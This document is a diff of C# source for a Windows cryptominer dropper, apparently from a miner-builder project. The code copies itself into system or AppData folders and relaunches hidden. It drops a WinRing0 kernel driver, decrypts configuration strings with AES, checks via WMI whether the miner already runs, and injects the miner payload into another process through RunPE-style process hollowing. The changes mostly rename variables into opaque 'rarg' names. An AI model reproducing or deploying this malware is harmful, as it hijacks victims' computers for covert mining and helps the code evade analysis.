@@ -9,7 +9,6 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
-using System.Linq;
 using Microsoft.Win32;
 #if DefDebug
 using System.Windows.Forms;
@@ -29,12 +28,12 @@ using System.Windows.Forms;
 public partial class RProgram
 {
 #if DefSystem32
-    public static string rbD = (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) + @"\" + RGetString("#LIBSPATH");
+    public static string rbD = ((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) + @"\" + RGetString("#LIBSPATH")).ToLower();
 #else
-    public static string rbD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH");
+    public static string rbD = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH")).ToLower();
 #endif
 #if DefInstall
-    public static string rplp = PayloadPath;
+    public static string rplp = (PayloadPath).ToLower();
 #endif
 
     public static void Main()
@@ -67,16 +66,8 @@ public partial class RProgram
             MessageBox.Show("M2: " +ex.ToString());
 #endif
         }
-        RInstall();
-#endif
-        RInitialize();
-    }
-
-#if DefInstall
-    public static void RInstall()
-    {
-        Thread.Sleep(1 * 1000);
-        if (Process.GetCurrentProcess().MainModule.FileName != rplp)
+        
+       if (Assembly.GetEntryAssembly().Location.ToLower() != rplp)
         {
             foreach (Process proc in Process.GetProcessesByName(RGetString("#WATCHDOG")))
             {
@@ -93,44 +84,25 @@ public partial class RProgram
                 File.Delete(Path.Combine(rbD, RGetString("#WATCHDOG") + "-2.log"));
             } catch(Exception ex) {}
 
-            File.Copy(Process.GetCurrentProcess().MainModule.FileName, rplp, true);
-            Thread.Sleep(2 * 1000);
-            RBaseFolder();
             Directory.CreateDirectory(Path.GetDirectoryName(rplp));
+            File.Copy(Assembly.GetEntryAssembly().Location.ToLower(), rplp, true);
+            Thread.Sleep(2 * 1000);
             Process.Start(new ProcessStartInfo
             {
                 FileName = rplp,
                 WorkingDirectory = Path.GetDirectoryName(rplp),  
                 WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true
+                CreateNoWindow = true,
             });
             Environment.Exit(0);
         }
-    }
 #endif
 
-    public static byte[] RGetTheResource(string rarg1)
-    {
-        var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
-        return RAES_Method((byte[])MyResource.GetObject(rarg1));
-    }
-
-    public static string RGetString(string rarg1)
-    {
-        return Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(rarg1)));
-    }
-
-    public static void RRun(byte[] rarg1, string rarg2)
-    {
-        // Credits gigajew for RunPE https://github.com/gigajew/Mandark
-        Load(rarg1, ("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), rarg2);
-    }
-
-    public static void RBaseFolder()
-    {
         try
         {
-            Directory.CreateDirectory(rbD);
+            try
+            {
+                Directory.CreateDirectory(rbD);
 #if DefWatchdog
             if (Process.GetProcessesByName(RGetString("#WATCHDOG")).Length < 1)
             {
@@ -145,60 +117,38 @@ public partial class RProgram
                 });
             }
 #endif
-            File.WriteAllBytes(Path.Combine(rbD, "WR64.sys"), RGetTheResource("#winring"));
-        }
-        catch (Exception ex)
-        {
+                File.WriteAllBytes(Path.Combine(rbD, "WR64.sys"), RGetTheResource("#winring"));
+            }
+            catch (Exception ex)
+            {
 #if DefDebug
             MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
 #endif
-        }
-    }
-
-    public static bool RCheckProc()
-    {
-        try
-        {
-            var options = new ConnectionOptions();
-            options.Impersonation = ImpersonationLevel.Impersonate;
-            var scope = new ManagementScope(@"\root\cimv2", options);
-            scope.Connect();
-
-            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
-            var query = new ObjectQuery(wmiQuery);
-            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
-            var managementObjectCollection = managementObjectSearcher.Get();
-            foreach (ManagementObject retObject in managementObjectCollection)
-            {
-                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(RGetString("#MINERID")))
-                {
-                    return true;                
-                }
             }
-        }
-        catch (Exception ex)
-        {
-#if DefDebug
-            MessageBox.Show("M4: " + Environment.NewLine + ex.ToString());
-#endif
-        }
-        return false;
-    }
 
-    public static void RInitialize()
-    {
-        try
-        {
-            RBaseFolder();
             string rS = "";
 
             System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
 
+            var rarg1 = new ConnectionOptions();
+            rarg1.Impersonation = ImpersonationLevel.Impersonate;
+            var rarg2 = new ManagementScope(@"\root\cimv2", rarg1);
+            rarg2.Connect();
+
+            var rarg3 = new ManagementObjectSearcher(rarg2, new ObjectQuery(string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget")))).Get();
+            foreach (ManagementObject MemObj in rarg3)
+            {
+                if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(RGetString("#MINERID")))
+                {
+                    Environment.Exit(0);
+                }
+            }
+
 #if DefGPU
             try
             {
-                string GPUstr = RGetGPU();
-                if (GPUstr.Contains("nvidia") || GPUstr.Contains("amd"))
+                string rarg7 = RGetGPU();
+                if (rarg7.Contains("nvidia") || rarg7.Contains("amd"))
                 {
                     try
                     {
@@ -241,12 +191,12 @@ public partial class RProgram
                                 }
                             }
 
-                            if (GPUstr.Contains("nvidia"))
+                            if (rarg7.Contains("nvidia"))
                             {
                                 rS += " --cuda --cuda-loader=" + "\"" + rbD + "ddb64.dll" + "\"";
                             }
 
-                            if (GPUstr.Contains("amd"))
+                            if (rarg7.Contains("amd"))
                             {
                                 rS += " --opencl ";
                             }
@@ -269,10 +219,6 @@ public partial class RProgram
             string argstr = RGetString("#ARGSTR") + rS;
             argstr = argstr.Replace("{%RANDOM%}", RTruncate("R" + Guid.NewGuid().ToString().Replace("-", ""), 10));
             argstr = argstr.Replace("{%COMPUTERNAME%}", RTruncate("C" + System.Text.RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""), 10));
-            if (RCheckProc())
-            {
-                Environment.Exit(0);
-            }
 
             byte[] rxM = { };
 
@@ -323,7 +269,7 @@ public partial class RProgram
                                     using (var ms = new MemoryStream())
                                     {
                                         streamdata.CopyTo(ms);
-                                        RRun(ms.ToArray(), argstr);
+                                        RRun(ms.ToArray(), ("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), argstr);
                                     }
                                 }
                             }
@@ -346,6 +292,17 @@ public partial class RProgram
         }
     }
 
+    public static byte[] RGetTheResource(string rarg1)
+    {
+        var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
+        return RAES_Method((byte[])MyResource.GetObject(rarg1));
+    }
+
+    public static string RGetString(string rarg1)
+    {
+        return Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(rarg1)));
+    }
+
     public static string RTruncate(string rarg1, int rarg2)
     {
         if (string.IsNullOrEmpty(rarg1))
@@ -360,22 +317,20 @@ public partial class RProgram
     {
         try
         {
-            string gpu = "";
+            string rarg7 = "";
 
-            var options = new ConnectionOptions();
-            options.Impersonation = ImpersonationLevel.Impersonate;
-            var scope = new ManagementScope(@"\root\cimv2", options);
-            scope.Connect();
+            var rarg4 = new ConnectionOptions();
+            rarg4.Impersonation = ImpersonationLevel.Impersonate;
+            var rarg5 = new ManagementScope(@"\root\cimv2", rarg4);
+            rarg5.Connect();
 
-            var query = new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController");
-            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
-            var managementObjectCollection = managementObjectSearcher.Get();
-            foreach (ManagementObject MemObj in managementObjectCollection)
+            var rarg6 = new ManagementObjectSearcher(rarg5, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
+            foreach (ManagementObject MemObj in rarg6)
             {
-                gpu += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]).ToLower();
+                rarg7 += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]).ToLower();
             }
 
-            return gpu;
+            return rarg7;
         }
         catch (Exception ex)
         {
@@ -389,22 +344,18 @@ public partial class RProgram
 
     public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
     {
-        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
-        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
-        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
-        var symmetricKey = new RijndaelManaged();
-        symmetricKey.KeySize = 256;
-        symmetricKey.Mode = CipherMode.CBC;
-        var encryption = rarg2 ? symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes) : symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
-        using (var mStream = new MemoryStream())
+        var rarg4 = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
+        var rarg5 = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
+        var rarg6 = rarg2 ? rarg5.CreateEncryptor(rarg4.GetBytes(16), Encoding.ASCII.GetBytes("#IV")) : rarg5.CreateDecryptor(rarg4.GetBytes(16), Encoding.ASCII.GetBytes("#IV"));
+        using (var rarg7 = new MemoryStream())
         {
-            using (var cStream = new CryptoStream(mStream, encryption, CryptoStreamMode.Write))
+            using (var rarg8 = new CryptoStream(rarg7, rarg6, CryptoStreamMode.Write))
             {
-                cStream.Write(rarg1, 0, rarg1.Length);
-                cStream.Close();
+                rarg8.Write(rarg1, 0, rarg1.Length);
+                rarg8.Close();
             }
 
-            return mStream.ToArray();
+            return rarg7.ToArray();
         }
     }
 
@@ -430,9 +381,9 @@ public partial class RProgram
     [DllImport("kernel32.dll")]
     private static extern long WriteProcessMemory(long rarg1,
                                                   long rarg2,
-                                                  byte[] lpBuffer,
-                                                  int nSize,
-                                                  long written);
+                                                  byte[] rarg3,
+                                                  int rarg4,
+                                                  long rarg5);
 
     [DllImport("ntdll.dll")]
     private static extern uint ZwUnmapViewOfSection(long rarg1,
@@ -452,7 +403,7 @@ public partial class RProgram
     [DllImport("kernel32.dll")]
     private static extern bool CloseHandle(long rarg1);
 
-    public static void Load(byte[] rarg1, string rarg2, string rarg3)
+    public static void RRun(byte[] rarg1, string rarg2, string rarg3)
     {
         int rarg4 = Marshal.ReadInt32(rarg1, 0x3c);
 
